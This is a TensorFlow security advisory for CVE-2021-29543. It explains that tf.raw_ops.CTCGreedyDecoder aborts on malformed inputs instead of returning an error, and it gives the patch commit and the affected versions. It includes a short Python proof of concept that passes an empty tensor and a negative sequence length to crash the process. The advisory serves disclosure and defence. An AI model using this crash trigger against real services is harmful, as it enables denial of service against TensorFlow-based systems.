<h2>TFSA-2021-032: <code>CHECK</code>-fail in <code>CTCGreedyDecoder</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29543</p>
<h3>Impact</h3>
<p>An attacker can trigger a denial of service via a <code>CHECK</code>-fail in
<code>tf.raw_ops.CTCGreedyDecoder</code>:</p>
<p>```python
import tensorflow as tf</p>
<p>inputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)
sequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)
merge_repeated = False</p>
<p>tf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)
```</p>
<p>This is because the
<a href="https://github.com/tensorflow/tensorflow/blob/1615440b17b364b875eb06f43d087381f1460a65/tensorflow/core/kernels/ctc_decoder_ops.cc#L37-L50">implementation</a>
has a <code>CHECK_LT</code> inserted to validate some invariants. When this condition is
false, the program aborts, instead of returning a valid error to the user. This
abnormal termination can be weaponized in denial of service attacks.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2">ea3b43e98c32c97b35d52b4c66f9107452ca8fb2</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
